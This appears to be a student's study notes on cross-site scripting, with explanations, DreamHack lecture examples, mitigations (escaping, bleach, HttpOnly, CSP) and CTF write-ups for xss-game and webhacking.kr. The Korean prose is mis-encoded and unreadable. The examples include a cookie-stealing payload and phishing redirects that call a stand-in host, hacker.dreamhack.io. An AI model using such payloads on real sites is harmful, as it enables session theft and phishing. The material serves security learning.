��ó : https://www.youtube.com/watch?v=DoN7bkdQBXU

<h1>XSS youtube ���� ���</h1>
<h3>XSS : Cross Site Scripting</h3>
<p>Ư���� script�� �����ϴ� �����̴�.</p>
<p>web�� CSS, JS�� ���� �پ��� ���������� ���������ν� �����̰� ȭ���� ���������� �����ϴ� ���� �Ϲ����ε�, �� �� ���� ��ǥ���� �� �׸��� �� ��������γ� ���� �߿��� ���� Javascript�κ��� XSS ������ ����̴�.</p>
<p>Javascript �� �ý��� ������� �̿��ؼ� Ư�� ������Ʈ�� � scripting ������ �����ؼ� �ڽ��� ������ ���ϰų� �ش� �ý����� �����Ű�ų� ���� ������ �����ϰų� �ϴ� ���� ����� �ٷ� XSS(Cross Site Scripting)</p>

XSS�� �پ��� ������� ������ �����ϴ�.

```html
<script>
    alert("XSS ����!");
</script>
```

```html
<a href="javascript:alert('XSS')">XSS</a>
```

```html
<img src="#" onerror="alert('XSS ����!');">
```


�ƽ�Ű�ڵ带 �̿��Ͽ� ������ ���� �ִ�.

![image](https://user-images.githubusercontent.com/62539341/82067066-2d613080-970b-11ea-8294-371bd482959f.png)

�� ��ȯ�� �ƽ�Ű�ڵ带 �� html�� �´� ���·� �����

![image](https://user-images.githubusercontent.com/62539341/82067251-6b5e5480-970b-11ea-99e5-5cac16aaea97.png)

XSS ������ ����ȴ�. �� ����� ���͸��� ���� �� ����� ���� �� ������ XSS �����̶�� �� �� �ִ�.

���� ���� �� �����غ���.

```html
<IFRAME ID = "showFRame" SRC="javascript:document.write('><script>
alert(3);
function show(){
    alert(5);
}
alert(4);
</script>
');" width="0" height="0" frameborder="0"></IFRAME>
<button id="button" onClice='document.getElementById("showFrame").contentWindow.show()'>��ư</button>
```

ũ�Ⱑ 0�̱� ������ �츮 ���� ������ ������ ������ �Ǵ� ��ŷ �����̴�.<br>

��ó : https://dreamhack.io/learn/1
<h1>XSS ���� �帲�� ���� & �ǽ�</h1>
<h3>Cross Site Scripting</h3>

<p>������ ���信 �����ڰ� ���Ե� �Ǽ� ��ũ��Ʈ�� ���� ������� �� ���������� �Ǽ� ��ũ��Ʈ�� ����Ǵ� ������� Cross Site Scripting (XSS)��� �Ѵ�.</p>

XSS ������ ���������� �����ϱ� ���ؼ� �ʿ��� 2���� ����

1. <b>�Է� �����Ϳ� ���� ����� ���� ������ ����� �Ѵ�.</b>
    - �Է��� �����Ͱ� ����� ���� ������ �̷������ �ʾ� �Ǽ� ��ũ��Ʈ�� ���Ե� �� �־�� �Ѵ�.
2. <b>������ ���� �����Ͱ� �� ������ �� �������� ��� �� ����� ���� ������ ����� �Ѵ�.</b>
    - ���� ������ ��� �� �Ǽ� ��ũ��Ʈ�� �� �������� ������ ������ �Ǽ� ��ũ��Ʈ�� �������� ������ �� �ִ� �� ���ҽ��� ���ϸ�, ��ǥ������ HTML, JS ���� �ִ�.

![image](https://user-images.githubusercontent.com/62539341/82070219-63a0af00-970f-11ea-9858-cf213c90d36e.png)

>XSS ������� ���� ������ ������ �� alert �Ǵ� prompt�� ���� �޽��� â�� �����ϴ� ������ XSS ������� �߻��Ͽ��ٴ� ���� �ð������� ǥ���� �����ϱ� �����Դϴ�. �ַ� �޽��� â���� �ش� �������� domain�� Ȯ���ϱ� ���� document.domain�� ���ڷ� �ݴϴ�.

<h3>XSS with Javascript</h3>
<p>Javascript(�ڹٽ�ũ��Ʈ)�� ������� �� ���������� ȭ���� �������� ������ �� �ֵ��� �ڵ����� ��ư�� �����ų� ȭ�� ������ �ٲٴ� ���� �۾��� �� �� ���� ���ȴ�. �̷��� UI���� ���� �ܿ��� ����ڿ��� ��ȣ�ۿ� ���� ������� �������� ������ ��ȸ�ϰų� �����ϴ� ���� ��û�� �ְ� ����޴� �͵� �����ϴ�. ������� ������ ������ �ִ� ���� ��Ű�� ����ڿ��� ����Ǿ��ְ� �� �������� �ش� ��Ű�� ������ �� �ֱ� �����̴�.</p>
<p>�̿ܿ��� �� ���������� ��µǾ����� �������� ������ �����ϰų�, �� �������� ��ġ�� �����ڰ� ���ϴ� �ּҷ� ���� �����ϴ�. ��ó�� ������� ���忡�� �߻��ϴ� ������ ���� ��ų �� �ֱ� ������ �ڹٽ�ũ��Ʈ�� XSS ���ݿ� ���� ���ȴ�.</p>
<p>�ڹٽ�ũ��Ʈ�� �����ϴ� ��ǥ���� ����� script �±׸� �̿��ϴ� ����� �ִ�. �����ڰ� �Է� �����ͷ� script �±׸� ���� �� �ٸ� ������� ���信 ���ԵǸ� �������� �ڹٽ�ũ��Ʈ�� ����ȴ�. script �±� �ܿ��� �±��� �Ӽ� �� Ư�� ��Ȳ���� �߻��ϴ� on* �̺�Ʈ���� ����Ͽ� �ڹٽ�ũ��Ʈ ������ ����.</p>

```html
<script>
// "hello" ���ڿ� alert ����.
alert("hello");
// ���� �������� ��Ű(return type: string)
document.cookie; 
// ���� �������� ��Ű�� ���ڷ� ���� alert ����.
alert(document.cookie);
// ��Ű ����(key: name, value: test)
document.cookie = "name=test;";
// new Image() �� �̹����� �����ϴ� �Լ��̸�, src�� �̹����� �ּҸ� ����. ������ �ּҴ� http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=��������������Ű" �ּҸ� ��û�ϱ� ������ ������ �ּҷ� ���� �������� ��Ű ��û��
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

```html
<script>
// ������� ������ ������ ����.
document;
// ������� �������� �����͸� ����.
document.write("Hacked By DreamHack !");
</script>
```

```html
<script>
// ������� ��ġ�� ����.
// �ǽ� ���� ������ ����.
location.href = "http://hacker.dreamhack.io/phishing"; 
// �� â ����
window.open("http://hacker.dreamhack.io/")
</script>
```

<h3>Stored XSS</h3>
<p>Stored XSS�� �Ǽ� ��ũ��Ʈ�� ���� ���� �����ϴ� �����ͺ��̽� �Ǵ� ���� ���� ���·� ����Ǿ� �ִٰ� ����ڰ� ����� �Ǽ� ��ũ��Ʈ�� ��ȸ�ϴ� ���� �߻��ϴ� ������ XSS. ��ǥ������ �Խ��� ���񽺿��� �ۼ��� �Խù��� Ȯ���ϴ� �������� �Ǽ� ��ũ��Ʈ�� ���Ե� �Խù��� ��ȸ�� �� �Ǽ� ��ũ��Ʈ�� ����Ǵ� ���� ����� �ִ�.</p>

<p>
������ ���¿� ���ټ�, �׸��� �ش� ���񽺸� ���� ���� �� �ִ� ���� �Ǵ� �����鿡 ���� �ı޷��� �޶��� �� �ִ�.</p>

<h3>Reflected XSS</h3>
<p>Reflected XSS�� �Ǽ� ��ũ��Ʈ�� ������� ��û �� ���۵Ǵ� ����. ������� ��û �����Ͱ� ������ ���信 ���ԵǴ� �������� HTML ���� �Ǽ� ��ũ��Ʈ�� �״�� ��µǾ� �߻��Ѵ�.</p>
<p>
Reflected XSS�� Stored XSS�ʹ� �ٸ��� ������� ��û �����Ϳ� ���� ������� �߻��ϱ� ������, ������ �����Ͱ� ������� ��û���� ���۵Ǵ� ���¸� �����ؾ� �Ѵ�. ���� ������ ������δ� Ư�� ��ũ�� �����ϴ� ����� �����ϸ� Click Jacking, Open Redirect ���� �ٸ� ������� �����Ͽ� �߻���Ű�� ����� �����Ѵ�.</p>
<p>
��ǥ���� ���÷δ� �Խ��� ���񽺿��� �ۼ��� �Խù����� ��ȸ�ϴ� �������� ��ȸ�ϱ� ���� �Է��� �����Ϳ� ���� �߻��ϴ� ����� �ִ�. ����ڰ� �Խù� ��ȸ�� ��û�ϸ� ������ �ش� ��û�� ���Ͽ� ��ȸ �� ����� ���信 ����ϸ�, ���Ǽ��� ���� ����ڰ� ��ȸ�� ������ ���信 ���Խ�Ű�⵵ �Ѵ�. �� �� ������������ �������� ��� �� �ݿ�(Reflect)�Ǵ� ����� ���� Reflected XSS�� �̾��� �� �ִ�.
</p>

<h3>Mitigations</h3>
<p>XSS�� �� ���񽺻󿡼� ����ϰ� �Ͼ�� ����� �� �ϳ��̸� �̸� ����ϴ� ���� ������� �����Ѵ�.</p>
<p>
������ �ܿ��� ����ϴ� ����Ӹ� �ƴ϶� ���� ���ο� �����ϴ� ���� Ȥ�� ����� �����͸� ������ ����ϴ� ������ �Է°��� �ùٸ��� �����ϴ� ������� XSS�� ����ؾ� �Ѵ�.
</p>

- Server-side Mitigations

- HTTPOnly �÷��� ���

- Content Security Policy ���

- X-XSS-Protection

<h3>Server-side Mitigations</h3>
<p>XSS�� ������ �� �ִ� �±� ������ �����ϱ� ���� ���� �ܿ��� �����ϴ� ���
</p>
<p>
����� ��ǲ�� HTML ���¸� ������ �ʿ䰡 ���� HTML �±װ� �Էµ� ���� ���ٸ� ���� (<, >), ����ǥ(", ')�� ���� Ư�� ���ڸ� HTML Entity Encoding�� �̿��� �±׷ν� �ν��� �ȵǵ��� �Ѵ�.
</p>
<p>
���� ����� ��ǲ�� HTML ���¸� �����ؾ� �Ѵٸ� ȭ��Ʈ����Ʈ ���͸��� �ؾ��Ѵ�.<br>
ȭ��Ʈ����Ʈ ���͸��̶� ����ص� ������ �Ϻ� �±�, �Ӽ��� ������ ��� ���� ���͸�, �Խñ��� ��ϴµ� �־ img, video, a �±׸� �ʿ��ϴٸ� �ش�Ǵ� �� ���� �±׸� ������ ��� �±״� ���͸� ��Ű�� ���
</p>

����� ��ǲ�� ���͸� �� �� ������ ���� ��û�� URI Query ���̳� POST Body ���� ���͸� �� ���� �ƴ϶� User-Agent, Referer�� ���� ����� ��� �����Ͽ� ����ڷκ��� �� ���� ��� �����ؾ� �Ѵ�.

Mozilla ���� ������ Bleach (https://github.com/mozilla/bleach) ��� HTML ���͸� ���̺귯���� ��õ

�� �ܿ��� ����ڰ� �α����� �� ���ǿ� �α����� IP�ּҸ� �Բ� �����ϰ�, ����ڰ� �������� ������ ������ ���� IP�ּҿ� �α��� �ߴ� IP�ּҰ� �������� ���θ� Ȯ���ϴ� ����� �ִ�. �� ����� �����ڰ� ���� ID�� Ż���ص� ����ڿ� IP�ּҰ� �޶� ������� ������ ������� ���ϰ� �ϴ� ������ �־� ���ſ� �θ� ������. �ֱٿ��� Mobile ȯ���� ����ڰ� ���� �������鼭 ������ WiFi�� �ٲ� ������ ������� IP�ּҰ� �Բ� �ٲ�� ������ ������ ������ IP�� �ƴ� ������ ������ ����� ��츦 Ž���ϴ� ���·� �ٲ����.

```py
# HTML Entity Encoding ����
from jinja2 import utils
@app.route('/board/', methods=['GET', 'POST'])
def write():
    ...
    if request.method == 'POST':
        title = utils.escape(request.form.get('title'))
        content = utils.escape(request.form.get('content'))
        query = '...' % (...)
        ...
        return result
# ȭ��Ʈ����Ʈ ���͸� ����
import bleach # https://github.com/mozilla/bleach
@app.route('/board/', methods=['GET', 'POST'])
def write():
    ...
    if request.method == 'POST':
        ALLOW_TAGS = ['a', 'p', 'h1', 'h2', 'h3']
        ALLOW_ATTRS = ['href']
        title = bleach.clean(request.form.get('title'), ALLOW_TAGS, ALLOW_ATTRS)
        content = bleach.clean(request.form.get('content'), ALLOW_TAGS, ALLOW_ATTRS)
        query = '...' % (...)
        ...
        return result
```
<h3>HTTPOnlyl Flag</h3>

```
Set-Cookie: session=sbdh1vjwvq; HttpOnly
```

HTTPOnly �÷��״� ���� ������ ���� ����� Set-Cookie ����� ������ ��Ű�� ������ �� �ɼ����� ���� �����ϸ� �ڹٽ�ũ��Ʈ���� �ش� ��Ű�� ���� �ϴ� ���� �����Ѵ�. �̸� Ȱ���ϸ� XSS ������� �߻��ϴ��� �����ڰ� �˾Ƴ� �� ���� ��Ű ���̱� ������ ������Ű�� ������ �� HTTPOnly �÷��׸� �����ϴ� ���� ��õ!

<h3>Content Security Policy (CSP)</h3>

CSP�� ���� ����� meta �±׸� ���� �Ʒ��� ���� �����ؼ� ����� �� �ְ�, ������ ���þ �����Ͽ� ����Ʈ���� �ε��ϴ� ���ҽ����� ��ó�� ������ �� �ִ�.

```html
Content-Security-Policy: <���þ�>; ...
```

���� ��� default-src 'self' *.dreamhack.io�� ���� ������ CSP�� ��� ���ҽ�(�̹��� ����, ��ũ��Ʈ ���� ��)�� ��ó�� ���� �������̰ų�, *.dreamhack.io�������� ��ó�� ��츸 ����Ѵ�. �� script-src�� ������ �ڹٽ�ũ��Ʈ �ڵ��� ��ó�� ������ �� ������, �����ڰ� �ܺο� ���ε�� �ڹٽ�ũ��Ʈ ������ ȣ���ϰų� ���� �ڹٽ�ũ��Ʈ �ڵ带 �ۼ��ϴ� ���� �ൿ�� ���� �� �ִ�. �ŷ��� ��ó�� �����ϴ� ����̴ϸ�ŭ �ŷڹ޴� CDN ������ ��ŷ���ϸ� ����ȭ�Ǵ� ������ �ִ�.

�� �ܿ��� ���� ���ҽ� ���� (�̹���, ��Ʈ, ������Ʈ, ...) �� ��ó�� ������ �� �ִ� ���þ���� �����ϸ� script-src 'nonce-noncevalue13b739d8ea12' �� ���� script-src�� �̿��� nonce (����) ���� �����ϰ� HTML �±׸� �̿��� �ڹٽ�ũ��Ʈ�� ������ ���� �ݵ�� �������� ������ nonce ���� �˾ƾ߸� ����� �� �ֵ��� �� �� �ִ�.

��, XSS ������ ���ϴ��� �������� �Ź� �����Ǵ� nonce ���� ������ �� ���ٸ� �Ϲ����� ������� �ڹٽ�ũ��Ʈ ������ �Ұ���������.

���� script-src 'sha256-hashvalue_base64' �� ���� ���·� �ڹٽ�ũ��Ʈ�� ��Ÿ�Ͻ�Ʈ�� �ؽø� ���� CSP�� �������ָ� �̸� ���ص� �ؽÿ� �ٸ� ��� �������� �ʵ��� �� �� �ִ�.

```html
<!doctype html>
<html>
    <head>
        <meta http-equiv="Content-Security-Policy" content="script-src 'sha256-5jFwrAK0UV47oFbVg/iCCBbxD8X1w+QvoOUepu4C2YA='">
    </head>
    <body>
    <script>alert(1);</script>
    </body>
</html>
```

�� �ڵ�� script �±� ���� �ڹٽ�ũ��Ʈ �ڵ��� �ؽø� �̸� ���� CSP �� ������ alert(1)�� ���������� ȣ���� �� �ֵ��� �� �����̴�.

<h3>X-XSS-Protection Header</h3>
X-XSS-Protection�� Response Header�� �Ʒ��� ���� �����ؼ� ����� �� �ִ�.

```js
X-XSS-Protection: <��>
```

�ش� ��å�� �� �������� ����� XSS Filter�� Ȱ��ȭ�� �������� �����Ѵ�. XSS Filter�� �� ���������� ���۵� Request ���� XSS ���� �ڵ�� �����ϰ� �����, Response�� �ش� ���� �ڵ尡 ���ԵǾ��� ��쿡 XSS ������ ����Ǿ��ٰ� �Ǵ��Ͽ� XSS ������ �߻������� �������� �˸��� �����Ѵ�. Reflected XSS ������ ���� ���� ������ ��� ���.

```js
X-XSS-Protection: 0
X-XSS-Protection: 1
X-XSS-Protection: 1; mode=block
X-XSS-Protection: 1; report=<reporting-uri>
```

�ش� Header�� �������� �ʾ��� ���� ������ �⺻ ���� 1��, �⺻���� �۵��Ѵ�. 0�� ��� XSS Filter�� ������� ������, 1�� ��� XSS ������ �����Ǹ� �ش� �κи� ������ �� ������ ����� ȭ�鿡 ����Ѵ�. mode=block�� ��� XSS ������ �����Ǹ� ������ ��ü�� �������� �ߴ��ϰ�, report�� ������ ��쿡 XSS ������ ������ ����� �̸� ������ �ּҿ� �Ű��Ͽ� ��ڰ� ��ó�ϱ� ���� �� �� �ִ�.

![image](https://user-images.githubusercontent.com/62539341/82078353-f7787800-971b-11ea-830b-611499c295a6.png)

<h1>XSS ���� ����</h1>

<h2>1) xssgame 1,2
https://xss-game.appspot.com/</h2>

<h3>Level 1</h3>

![image](https://user-images.githubusercontent.com/62539341/82110432-84055380-9779-11ea-96ce-bd319ba726b4.png)

![image](https://user-images.githubusercontent.com/62539341/82110472-caf34900-9779-11ea-9f34-6e9a05ae4315.png)

Javascript�� alert â�� ���� ���� �ܰ�� �Ѿ�ٰ� �����ֽ��ϴ�.

![image](https://user-images.githubusercontent.com/62539341/82110691-41dd1180-977b-11ea-99cd-7c6cd820ccae.png)

�� Ÿ���Դϴ�. �ϴ� �ƹ��ų� �Է��غ��ҽ��ϴ�.

![image](https://user-images.githubusercontent.com/62539341/82110702-5e794980-977b-11ea-871a-24f60ea7193b.png)

GET ������� query ���� �������ϴ�.

�������� alert�� �������� �ؼ� �� ó���� ��� �⺻���� alert�� �Ἥ GET ������� �����ô���

![image](https://user-images.githubusercontent.com/62539341/82110741-92546f00-977b-11ea-89a3-6d9380fc85e8.png)

���� ������ �ҽ����⸦ ���غôµ�.. ������ Ǯ�Ƚ��ϴ�..!

<h3>Level 2</h3>

![image](https://user-images.githubusercontent.com/62539341/82110813-e8c1ad80-977b-11ea-882e-e76918f29bd7.png)

�̹� ������... alert() �� �˾��϶�±���.

![image](https://user-images.githubusercontent.com/62539341/82110843-068f1280-977c-11ea-8673-f2efa65dc1dd.png)

�̹� ������ Ÿ���Դϴ�. � ������ �Է��ؼ� ����Ʈ�ϴ� �� ������ �����ϴ�.

�̹��� �ٷ� �����Ӽҽ��� ������ �ϰڽ��ϴ�.

![image](https://user-images.githubusercontent.com/62539341/82111065-296df680-977d-11ea-92e2-7419b4d795e6.png)

POST ������� �Է¹޴±���..

![image](https://user-images.githubusercontent.com/62539341/82111096-78b42700-977d-11ea-9be7-247534d77e31.png)

�Ʊ�ó�� �Է��ϴ� ������ ��Ǯ���ϴ�...

�ٸ� ����� ��߰ڱ���

![image](https://user-images.githubusercontent.com/62539341/82111116-a305e480-977d-11ea-87e5-d41d70cd0a43.png)

�̹��� �̷��� �ѹ� �Է��غô��� 

![image](https://user-images.githubusercontent.com/62539341/82111124-b913a500-977d-11ea-9e3f-3ce7b1f00c85.png)

�����Դϴ�!!

<h2>2) webhacking-kr old.23</h2>

![image](https://user-images.githubusercontent.com/62539341/82112191-a309e280-9785-11ea-8314-8e7ba330736c.png)

�̹����� ���� ��ǥ�� alert�� ���� ���̳׿�.

![image](https://user-images.githubusercontent.com/62539341/82112204-c7fe5580-9785-11ea-8ab7-571140780249.png)

GET ������� �Է°��� �޾ƿ��±���.

![image](https://user-images.githubusercontent.com/62539341/82112372-3e4f8780-9787-11ea-9b2b-6364dff2a762.png)

![image](https://user-images.githubusercontent.com/62539341/82112530-99ce4500-9788-11ea-8538-31686d2a02f8.png)

�Ʊ� ��� �� ����� ����غôµ� ������ �ʽ��ϴ�. 
(��� ����..?)

���¿��� ����� ��ǲ�� <,> ���� �� ���� �ʿ䰡 ���ٸ� thml �±׷� �ν� �ȵǵ��� ���� ������� XSS�� ���� �� �ִٰ� �ߴ�. �׷��� <,>�� ���� ���� �ʰ� �ƽ�Ű�ڵ�� ��ȯ�ؼ� �־�� ���� ������?

![image](https://user-images.githubusercontent.com/62539341/82132797-a43b1e00-981e-11ea-93a8-038fa064aeb5.png)

�� �� ��� �־�ôµ� ���â�� ���� �ʴ´�. �ٽ� �ѹ� ����غ��߰ڴ�...

��� �ƹ��ų� �Է��غ��ٰ� ã�Ƴ� ����

![image](https://user-images.githubusercontent.com/62539341/82132889-e4e76700-981f-11ea-9cb1-94ac052f2619.png)

���ڸ� �Է��ϸ� �������� �� ���´�.

![image](https://user-images.githubusercontent.com/62539341/82132901-05afbc80-9820-11ea-9831-d3373cdb807b.png)

�̷��� ���ڸ� �Է��ϴϱ� no hack�̶�� ���. �׷��� ���ڸ� �� ���� ���ΰ�?

![image](https://user-images.githubusercontent.com/62539341/82132912-29730280-9820-11ea-932b-703a0954ba51.png)

a�� b ���̿� ����ǥ?�� �����ϱ� �� ��µȴ�.

�׷��� script alert ��ɿ� ���̻��̿� ���ڰ� �ƴ� ���� ������ �Ƹ� �� ��µ� ���̴�. �׷��ٰ� ���ڳ� ? �����Ÿ� ������ ����� ����� ����ȵ� ���̴� �Ʊ� ����ϴ� �ƽ�Ű�ڵ忡 NULL �� ������ ���� ������?

![image](https://user-images.githubusercontent.com/62539341/82133028-b5d1f500-9821-11ea-97e3-fb36af9b2191.png)

![image](https://user-images.githubusercontent.com/62539341/82133041-c1bdb700-9821-11ea-9982-8d6d13dd010e.png)

���� Ǯ�ȴ�!!! ������ ������ ���� �������..